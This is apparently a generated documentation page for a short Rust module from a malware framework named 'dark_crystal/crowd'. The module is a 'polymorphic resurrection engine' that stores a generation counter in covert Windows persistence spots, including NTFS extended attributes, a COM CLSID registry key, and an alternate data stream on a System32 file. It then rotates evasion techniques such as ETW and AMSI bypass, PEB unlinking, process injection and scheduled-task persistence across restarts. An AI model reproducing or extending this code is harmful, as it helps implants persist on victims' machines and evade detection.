# edo_tensei_resurrection

| Field | Value |
|-------|-------|
| **Source** | `source-extracts/edo_tensei_resurrection.rs` |
| **Lines** | 33 |

## Constants

- `SOUL_EA_NAME`: `&str` = `"CrowdEdoGenIdx"` — NTFS Extended Attributes
- `SOUL_REG_SUBKEY`: `&str` = `r"Software\Classes\CLSID\{b4bab081-...}\Config"` — Registry COM key
- `SOUL_ENV_VAR`: `&str` = `"CROWD_GEN"` — Environment variable
- `SOUL_ADS_TARGET`: `&str` = `r"C:\Windows\System32\en-US\kernel32.dll.mui"` — NTFS ADS
- `SOUL_ADS_STREAM`: `&str` = `":CrowdGen"`

## Public API

### `apply_resurrection` (line 22)
```rust
pub fn apply_resurrection(cfg: &mut ChainConfig) -> u32
```

## Full Source

```rust
// Source: dark_crystal/crowd/src/edo_tensei.rs
// Technique: T014 - Edo Tensei (Polymorphic Resurrection Engine)
// Tier: S
//
// On each process restart, reads generation index from soul storage,
// applies that generation's technique stack, then advances to next gen.
// Each resurrection produces a different behavioral fingerprint.

// Soul storage backends — 4 covert persistence locations
const SOUL_EA_NAME: &str = "CrowdEdoGenIdx";                           // NTFS Extended Attributes
const SOUL_REG_SUBKEY: &str = r"Software\Classes\CLSID\{b4bab081-...}\Config"; // Registry COM key
const SOUL_ENV_VAR: &str = "CROWD_GEN";                                 // Environment variable
const SOUL_ADS_TARGET: &str = r"C:\Windows\System32\en-US\kernel32.dll.mui"; // NTFS ADS
const SOUL_ADS_STREAM: &str = ":CrowdGen";

/// Generation cycle example:
/// Gen 0: threadless + etw + sleep_3000 + com_hijack
/// Gen 1: early_bird + amsi_hbp + sleep_5000 + ntfs_ea
/// Gen 2: dirty_vanity + peb_unlink + sleep_2000 + schtask
/// ...wraps around to Gen 0 after max_generations

pub fn apply_resurrection(cfg: &mut ChainConfig) -> u32 {
    let gen = read_generation();
    let chain_len = if EDO_CHAIN_LEN == 0 { 1 } else { EDO_CHAIN_LEN };
    let idx = (gen as usize) % chain_len;

    apply_generation(cfg, idx);

    let next_gen = if gen + 1 >= EDO_MAX_GENERATIONS { 0 } else { gen + 1 };
    write_generation(next_gen);

    gen
}

```